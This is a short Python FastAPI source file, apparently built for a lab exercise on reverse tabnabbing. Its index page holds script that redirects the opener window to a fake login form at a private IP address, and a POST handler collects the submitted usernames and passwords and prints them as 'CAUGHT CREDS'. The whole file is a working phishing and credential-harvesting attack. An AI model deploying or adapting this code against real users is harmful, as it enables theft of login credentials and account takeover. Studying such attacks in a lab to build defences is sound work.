from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse

app = FastAPI()

# Serve the fake login page
@app.get('/', response_class=HTMLResponse)
def index():
    return """
    <html><body>
    <script>
    window.opener.location = "http://192.168.56.1:5555/login.html";
    </script>
    </body></html>
"""

@app.get("/login.html", response_class=HTMLResponse)
def login_page():
    return """
    <html><body>
    <form action="/login.html" method="post">
      <input type='text' class='form_control' name="username">
      <input name="password" type="password">
      <input type="submit">
    </form>
    </body></html>
    """

# Catch the submitted creds
@app.post("/login.html")
async def catch(request: Request):
    body = await request.form()
    print("🎣 CAUGHT CREDS:", dict(body))
    return HTMLResponse("OK")
